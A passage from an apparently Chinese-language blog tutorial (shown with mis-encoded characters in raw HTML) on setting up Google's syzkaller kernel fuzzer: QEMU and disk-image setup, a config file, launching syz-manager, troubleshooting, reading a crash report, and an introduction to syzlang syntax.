03:02 stretch.id_rsa</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3        569 Nov 12 03:02 stretch.id_rsa.pub</span><br><span class="line">-rw-rw-r--  1 arttnba3 arttnba3 2147483648 Nov 12 03:02 stretch.img</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ªåä¸º <code>stretch.img</code> çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯æ„å»ºå¥½çš„ç£ç›˜é•œåƒæ–‡ä»¶</p><h2 id="å®‰è£…-qemu"><a href="#å®‰è£…-qemu" class="headerlink" title="å®‰è£… qemu"></a>å®‰è£… qemu</h2><p>è¿™ä¸€æ­¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½ å’Œç¬”è€…ä¸€æ ·åœ¨ VMware ä¸Šä½¿ç”¨ Linux åˆ™åº”å½“åœ¨è®¾ç½®ä¸­æŠŠ <code>è™šæ‹ŸåŒ– Intel VT-x/EPT æˆ– AMD-V/RVI(V)</code> æ‰“å¼€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-system-x86</span></span><br></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€åˆ‡ä¹‹åçœ‹çœ‹å†…æ ¸æ˜¯å¦èƒ½å¤Ÿè¢«æˆåŠŸå¯åŠ¨ï¼Œå¯åŠ¨è„šæœ¬å¦‚ä¸‹ï¼ˆåˆ«å¿˜äº†æ›¿æ¢å†…æ ¸é•œåƒä¸ç¡¬ç›˜é•œåƒçš„è·¯å¾„ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 2G \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \</span><br><span class="line">-drive file=./stretch.img,format=raw \</span><br><span class="line">-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-nographic \</span><br><span class="line">-pidfile vm.pid \</span><br><span class="line">2&gt;&amp;1 | <span class="built_in">tee</span> vm.log</span><br></pre></td></tr></table></figure><p>é»˜è®¤ root è´¦æˆ·æ— å¯†ç ï¼ŒæˆåŠŸç™»å…¥</p><p><img src="https://i.loli.net/2021/11/12/v5sQXyulgK92Mq1.png" alt="image.png"></p><p>å‰é¢åœ¨é…ç½®ç¡¬ç›˜é•œåƒæ–‡ä»¶æ—¶è¿˜ç»™æˆ‘ä»¬æä¾›äº† ssh keyï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ ssh æ¥ç›´æ¥è¿æ¥è‡³è™šæ‹Ÿæœºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh -i ./stretch.id_rsa -p 10021 -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œéœ€è¦çš„ç¯å¢ƒå°±éƒ½é…ç½®å®Œæˆäº†</p><h1 id="0x02-å¼€å§‹ä½¿ç”¨-syzkaller"><a href="#0x02-å¼€å§‹ä½¿ç”¨-syzkaller" class="headerlink" title="0x02.å¼€å§‹ä½¿ç”¨ syzkaller"></a>0x02.å¼€å§‹ä½¿ç”¨ syzkaller</h1><h2 id="PRE-å·¥ä½œåŸç†"><a href="#PRE-å·¥ä½œåŸç†" class="headerlink" title="PRE.å·¥ä½œåŸç†"></a><em>PRE.å·¥ä½œåŸç†</em></h2><p>å¯¹äº syzkaller çš„æ¶æ„ï¼Œå®˜æ–¹ç»™å‡ºäº†è¿™æ ·çš„ä¸€å¼  Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><ul><li><p><code>syz-manager</code> ï¼šsyzkaller çš„æ§åˆ¶ä¸­æ¢ï¼Œå…¶ä¼šå¯åŠ¨å¤šä¸ª VM å®ä¾‹ï¼ˆå¦‚å›¾æ‰€ç¤ºçš„ä¸€ä¸ªé»„è‰²å¡ç‰‡å°±æ˜¯ä¸€ä¸ªå®ä¾‹ï¼‰å¹¶è¿›è¡Œç›‘è§†ï¼ŒåŒæ—¶é€šè¿‡ RPC æ¥å¯åŠ¨ <code>syz-fuzzer</code></p></li><li><p><code>syz-fuzzer</code> ï¼šè´Ÿè´£å¼•å¯¼æ•´ä¸ª fuzz çš„è¿‡ç¨‹ï¼š</p><ul><li>ç”Ÿæˆ input</li><li>å¯åŠ¨ <code>syz-executor</code> è¿›ç¨‹è¿›è¡Œ fuzz</li><li>ä»è¢« fuzz çš„ kernel çš„ <code>/sys/kernel/debug/kcov</code> è·å¾—è¦†ç›–ï¼ˆcoverageï¼‰çš„ç›¸å…³ä¿¡æ¯</li><li>é€šè¿‡ RPC å°†æ–°çš„è¦†ç›–å›é€åˆ° <code>syz-manager</code></li></ul></li><li><p><code>syz-executor</code>ï¼šè´Ÿè´£<strong>æ‰§è¡Œå•ä¸ªè¾“å…¥</strong>â€”â€”ä» <code>syz-fuzzer</code> å¤„æ¥å— input å¹¶æ‰§è¡Œï¼Œæœ€åå›é€ç»“æœ</p></li></ul><h2 id="é…ç½®æ–‡ä»¶ï¼ˆfor-testï¼‰"><a href="#é…ç½®æ–‡ä»¶ï¼ˆfor-testï¼‰" class="headerlink" title="é…ç½®æ–‡ä»¶ï¼ˆfor testï¼‰"></a>é…ç½®æ–‡ä»¶ï¼ˆfor testï¼‰</h2><p>æˆ‘ä»¬éœ€è¦ä¸º syzkaller ç¼–å†™é¢å¤–çš„é…ç½®æ–‡ä»¶ï¼Œä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„æ›¿æ¢ä¸ºä½ è‡ªå·±çš„è·¯å¾„ï¼ŒåŒ…æ‹¬ <code>workdir</code> æ–‡ä»¶å¤¹ä½ åº”å½“æ‰‹åŠ¨ mkdir ä¸€ä¸ªï¼š</p><blockquote><p>config.cfg</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å¯åŠ¨-syzkaller"><a href="#å¯åŠ¨-syzkaller" class="headerlink" title="å¯åŠ¨ syzkaller"></a>å¯åŠ¨ syzkaller</h2><p>åœ¨ syzkaller ç›®å½•ä¸‹è¾“å…¥å¦‚ä¸‹å‘½ä»¤å¯åŠ¨ syzkallerï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸå¯åŠ¨åæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—® <code>localhost:56741</code> æ¥è·å– syzkaller çš„çŠ¶æ€ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/11/12/BnYuNbO2MdiEw5V.png" alt="image.png"></p><h3 id="å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜"><a href="#å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜" class="headerlink" title="*å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜"></a><em>*å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜</em></h3><h4 id="æ— æ³•å¯åŠ¨-vm-instance"><a href="#æ— æ³•å¯åŠ¨-vm-instance" class="headerlink" title="æ— æ³•å¯åŠ¨ vm instance"></a>æ— æ³•å¯åŠ¨ vm instance</h4><p>æœ‰å¯èƒ½ä¼šé‡åˆ°æ— æ³•å¯åŠ¨ vm instance çš„é—®é¢˜ï¼ŒæŠ¥é”™å½¢å¼å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64: error: failed to set MSR 0x48f to 0x7fffff00036dfb</span><br><span class="line">qemu-system-x86_64: ../../target/i386/kvm/kvm.c:2753: kvm_buf_set_msrs: Assertion `ret == cpu-&gt;kvm_msr_buf-&gt;nmsrs&#x27; failed.</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§å®˜æ–¹ç»™å‡ºçš„è§£å†³åŠæ³•æ˜¯åœ¨ qemu çš„å¯åŠ¨å‚æ•°ä¸­å»æ‰ <code>-cpu host,migratable=off</code>ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é…ç½®æ–‡ä»¶çš„ <code>vm</code> é¡¹ä¸­æ·»åŠ  <code>qemu-args</code>é¡¹ï¼Œå€¼ä¸º <code>-enable-kvm</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;qemu_args&quot;</span><span class="punctuation">:</span><span class="string">&quot;-enable-kvm&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ç½‘ç»œè®¾å¤‡é—®é¢˜"><a href="#ç½‘ç»œè®¾å¤‡é—®é¢˜" class="headerlink" title="ç½‘ç»œè®¾å¤‡é—®é¢˜"></a>ç½‘ç»œè®¾å¤‡é—®é¢˜</h4><p>åœ¨ syzkaller æŒ–æ˜è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[FAILED] Failed to start Raise network interfaces.</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¼¼ä¹è¿˜æ˜¯èƒ½æ­£å¸¸å¯åŠ¨çš„</p><h2 id="crash-åˆ†æ"><a href="#crash-åˆ†æ" class="headerlink" title="crash åˆ†æ"></a>crash åˆ†æ</h2><p>ç¬”è€…æœ¬æ¥æƒ³å†™ä¸€ä¸ªæœ‰æ¼æ´ç‚¹å†…æ ¸æ¨¡å—æ¥äººä¸ºåˆ¶é€  crashï¼Œä¸è¿‡ç°åœ¨åˆšå¼€æŒ–æ²¡å‡ åˆ†é’Ÿå°±å‡ºäº†ä¸€ä¸ª crashï¼Œç”±äºç”¨çš„æ˜¯ 5.11 ç‰ˆæœ¬çš„å†…æ ¸ï¼Œå·²ç»ä¸ç®—å¤ªæ–°äº†ï¼Œç¬”è€…è®¤ä¸ºåº”è¯¥æ˜¯æŒ–åˆ°äº†ç°æœ‰çš„ CVEï¼Œé€šè¿‡ Google ç¬”è€…ä¹Ÿæ‰¾åˆ°äº†ä¸€ä¸ª<a href="https://syzkaller.appspot.com/bug?id=ad240ff5c32ca4f3406dc3acca519370693bb47c">åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ crash</a>ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯æ¥ç®€å•åˆ†æä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/11/12/7EHYatBoG6KFxqR.png" alt="image.png"></p><p>åœ¨ Description é¡¹ä¸­è¯´æ˜äº† crash çš„ç®€è¦ä¿¡æ¯ï¼Œç‚¹å¼€åˆ†ä¸ºä¸¤é¡¹ï¼š<code>log</code> å’Œ <code>report</code></p><p><img src="https://i.loli.net/2021/11/12/Q6dBoPOHm7sRtgI.png" alt="image.png"></p><p>log ä¸­ç»™å‡ºçš„æ˜¯ fuzz çš„æµç¨‹ï¼ŒåŒ…æ‹¬è¿è¡Œçš„ç³»ç»Ÿè°ƒç”¨ã€è¾“å…¥å‚æ•°ç­‰ä¸€ç³»åˆ—ä¿¡æ¯ï¼Œå› ä¸ºæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„æ‰€ä»¥ä¸€èˆ¬ä¸ä¼šç‰¹åˆ«å¥½çœ‹</p><p><img src="https://i.loli.net/2021/11/12/ANwKC67iRQL2ZHt.png" alt="image.png"></p><p>report ä¸­ç»™å‡ºçš„åˆ™æ˜¯ kernel ç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚è°ƒç”¨æ ˆå›æº¯ç­‰</p><p><img src="https://i.loli.net/2021/11/12/UvNkQe7ElAHSKm6.png" alt="image.png"></p><p>æ¯”è¾ƒå¯æƒœçš„æ˜¯è¿™ä¸ª crash <strong>æ²¡æ³•é‡ç°</strong>ï¼Œåœ¨ä¸€ä¸ª crash åˆšåˆšç”Ÿæˆæ—¶ syzkaller ä¼šå°è¯•è¿›è¡Œé‡ç°ï¼Œæ­¤æ—¶ report çš„çŠ¶æ€ä¼šæ˜¾ç¤ºä¸º <code>reproducing</code>ï¼Œè‹¥æˆåŠŸäº†åˆ™ä¼šæ˜¾ç¤ºå¯¹åº”çš„ç»“æœï¼Œå“ç›¸æ¯”è¾ƒå¥½çš„ä¸€ç§ report å°±æ˜¯ <code>has C repo</code>ï¼šæœ‰äº§ç”Ÿè¯¥ crash çš„ C ä»£ç </p><p><img src="https://i.loli.net/2021/11/12/l47kcaVMS9wH6u5.png" alt="image.png"></p><h1 id="0x03-ä½¿ç”¨-syzlang-ç¼–å†™æè¿°æ–‡ä»¶è¿›è¡Œ-fuzz"><a href="#0x03-ä½¿ç”¨-syzlang-ç¼–å†™æè¿°æ–‡ä»¶è¿›è¡Œ-fuzz" class="headerlink" title="0x03.ä½¿ç”¨ syzlang ç¼–å†™æè¿°æ–‡ä»¶è¿›è¡Œ fuzz"></a>0x03.ä½¿ç”¨ syzlang ç¼–å†™æè¿°æ–‡ä»¶è¿›è¡Œ fuzz</h1><p>ç›´æ¥å°±è¿™æ ·æŒ‚ç€è‚¯å®šä¸èƒ½ç›´æ¥å°±æŠŠæ´æŒ–å‡ºæ¥<del>è™½ç„¶ç¬”è€…å‰é¢æ²¡æŒ‚ä¸€ä¼šå°±å‡ºäº†ä¸€ä¸ªcrash</del>ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦äººå·¥é…ç½®ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿ï¼Œä»¥<strong>æœ‰é’ˆå¯¹æ€§åœ°</strong>è¿›è¡Œæ¼æ´æŒ–æ˜</p><p>syzkaller ä½¿ç”¨å®ƒè‡ªå·±çš„å£°æ˜å¼è¯­è¨€ï¼ˆSyscall Description Languageï¼Œaka <code>syzlang</code>ï¼ˆè¯»ä½œ <code>[siËzËˆlÃ¦Å‹g]</code>ï¼Œ<del>ç¬”è€…ä»¥å‰ä¸€ç›´è¯»ä½œ [saiËzËˆlÃ¦Å‹g]â€¦</del>ï¼‰ï¼‰æ¥æè¿°ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿ï¼Œåœ¨å®‰è£…ç›®å½•ä¸‹çš„ <code>docs/syscall_descriptions.md</code> ä¸ <code>docs/syscall_descriptions_syntax.md</code> ä¸­æœ‰ç€ç›¸å…³çš„è¯´æ˜ï¼Œåœ¨ç¬”è€…çœ‹æ¥æ˜¯ç±»ä¼¼ C çš„ä¸€é—¨æè¿°è¯­è¨€</p><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨ syzlang æ¥ç¼–å†™ç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨æè¿°æ–‡ä»¶ï¼ˆä¹Ÿå«è§„åˆ™æ–‡ä»¶ï¼Œåæ–‡ä¸­è¿™ä¸¤ä¸ªè¯æŒ‡çš„æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼‰ï¼Œsyzkaller ä¼šæ ¹æ®æˆ‘ä»¬çš„æè¿°æ–‡ä»¶æœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œ fuzz</p><p><a href="https://github.com/google/syzkaller/blob/master/sys/linux/sys.txt">è¿™æ˜¯ Google ç»™å‡ºçš„ä¸€ä¸ªä¾‹å­</a></p><blockquote><p>ç¬”è€…çœ‹ç€ä¹Ÿæ˜¯æ¯”è¾ƒå¤´å¤§çš„â€¦è¿˜æ˜¯æ…¢æ…¢æ¥å§â€¦</p><p>ä»¥ä¸‹ä¸»è¦æ˜¯ç¿»è¯‘è°·æ­Œå®˜æ–¹çš„æ–‡æ¡£ï¼ˆ<del>è°å«å›½å†…æ²¡æœ‰ä¸­æ–‡æ–‡æ¡£å‘¢</del>ï¼‰ï¼Œå¤–åŠ ä¸€äº›ç¬”è€…è‡ªå·±æœ¬äººçš„ç†è§£ä»¥åŠè¡¥å……è¯´æ˜</p></blockquote><h2 id="syzlang-è¯­æ³•"><a href="#syzlang-è¯­æ³•" class="headerlink" title="syzlang è¯­æ³•"></a>syzlang è¯­æ³•</h2><p>syzlang çš„è¯­æ³•ç»“æ„å¦‚ä¸‹ï¼Œ<del>çœ‹å®Œä½ ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ï¼</del>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]</span><br><span class="line">arg = argname type</span><br><span class="line">argname = identifier</span><br><span class="line">type = typename [ &quot;[&quot; type-options &quot;]&quot; ]</span><br><span class="line">typename = &quot;const&quot; | &quot;intN&quot; | &quot;intptr&quot; | &quot;flags&quot; | &quot;array&quot; | &quot;ptr&quot; |</span><br><span class="line">   &quot;string&quot; | &quot;strconst&quot; | &quot;filename&quot; | &quot;glob&quot; | &quot;len&quot; |</span><br><span class="line">   &quot;bytesize&quot; | &quot;bytesizeN&quot; | &quot;bitsize&quot; | &quot;vma&quot; | &quot;proc&quot;</span><br><span class="line">type-options = [type-opt [&quot;,&quot; type-opt]]</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªæ—¶å€™ä½ éœ€è¦æŠŠè‡ªå·±å½“ä½œä¸€ä¸ª scanner + parserï¼ˆå¤§é›¾</p><p><del>æ­£åˆ™è¡¨è¾¾å¼ç›¸ä¿¡å¤§å®¶åº”è¯¥éƒ½å­¦è¿‡ï¼Œå“ªæ€•æ²¡å­¦è¿‡ç¼–è¯‘åŸç†è¯¾ä¸Šä½ æ€»ä¼šå­¦åˆ°çš„ï¼Œé‚£ä¹ˆæŒ‰ç…§æ­£åˆ™æ¥çœ‹çš„è¯å…¶å®è¿™ä¸ªè¯­æ³•ç»“æ„å¹¶ä¸éš¾è§£æ</del>ï¼ˆ</p></blockquote><p>ä»¥ä¸‹æ˜¯å¯¹å…¶ä¸­çš„ä¸€äº›ç¬¦å·è¯´æ˜ï¼Œ<strong>ä¸æ˜¯ syzlang å®é™…è¯­æ³•å†…å®¹</strong>ï¼š</p><ul><li>åŒå¼•å· <code>&quot;&quot; </code>è¡¨ç¤ºè¿™ä¸ªç¬¦å·å†…çš„ä¸œè¥¿è¡¨ç¤º<strong>è¦æŒ‰å…¶åŸæ ·è¿›è¡ŒåŒ¹é…</strong>ï¼Œä¸¢å¼ƒåŒå¼•å·</li><li>æˆ–ç¬¦å· <code>|</code> è¡¨ç¤ºå€¼å¯ä»¥å–å·¦è¾¹ä¹Ÿå¯ä»¥å–å³è¾¹</li><li>ç­‰äºå· <code>=</code> è¡¨ç¤ºå·¦è¾¹çš„è¡¨è¾¾å¼åº”å½“ä¸ºå³è¾¹çš„å½¢å¼</li><li>ä¸­æ‹¬å· <code>[]</code> è¡¨ç¤ºä¸€ä¸ª<strong>å¯é€‰è¡¨è¾¾å¼</strong>ï¼Œå–å…¶å†…çš„å€¼å¹¶ä¸¢å¼ƒä¸­æ‹¬å·</li><li>æ˜Ÿå· <code>*</code> è¡¨ç¤º<strong>é—­åŒ…</strong>ï¼Œå³ 0 æ¬¡æˆ–å¤šæ¬¡çš„è‡ªæˆ‘è¿æ¥  <del>ä»€ä¹ˆï¼Ÿä½ è¿˜æ²¡å­¦è¿‡ç¦»æ•£æ•°å­¦</del></li></ul><p>è¿™æ˜¯è°·æ­Œå®˜æ–¹ç»™å‡ºçš„ä¸€ä¸ªä¾‹å­ï¼š</p><blockquote><p><code>syzkaller</code> uses declarative description of syscall interfaces to manipulate programs (sequences of syscalls). Below you can see (hopefully self-explanatory) excerpt from the descriptions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file filename, flags flags[open_flags], mode flags[open_mode]) fd</span><br><span class="line">read(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">close(fd fd)</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p><del>æ–¯å¯†ğŸ¦„èµ›ï¼ŒğŸ‘´æ²¡æ³•åšåˆ° self-explanatory</del></p></blockquote><h3 id="O-æ³¨é‡Šä¸æ–‡ä»¶åŒ…å«"><a href="#O-æ³¨é‡Šä¸æ–‡ä»¶åŒ…å«" class="headerlink" title="O.æ³¨é‡Šä¸æ–‡ä»¶åŒ…å«"></a>O.æ³¨é‡Šä¸æ–‡ä»¶åŒ…å«</h3><p>syzlang ä¸­çš„æ³¨é‡Šä¸ shell è„šæœ¬æ³¨é‡Šå½¢å¼ç›¸åŒï¼Œä¸ºä»¥ <code>#</code> å¼€å¤´çš„å•è¡Œæ³¨é‡Š</p><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># this is a useful sentence! do not delete it!</span><br></pre></td></tr></table></figure><p>åœ¨ syzlang ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é¢å¤–å¼•å…¥<strong>å†…æ ¸æºç æ–‡ä»¶</strong>ä½œä¸ºå‚æ•°ã€ç³»ç»Ÿè°ƒç”¨â€¦ç­‰ç­‰ä¸€ç³»åˆ—çš„è¡¥å……ï¼Œå½¢å¼ä¸ C è¯­è¨€çš„ include è¯­å¥å¤§è‡´ç›¸åŒï¼Œä¸è¿‡**æ²¡æœ‰äº†å¼€å¤´çš„â€#â€**ï¼ˆå› ä¸º # å¼€å¤´æ˜¯æ³¨é‡Šï¼‰</p><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br></pre></td></tr></table></figure><h3 id="I-å‚æ•°ï¼ˆargï¼‰ä¸å‚æ•°åï¼ˆargnameï¼‰"><a href="#I-å‚æ•°ï¼ˆargï¼‰ä¸å‚æ•°åï¼ˆargnameï¼‰" class="headerlink" 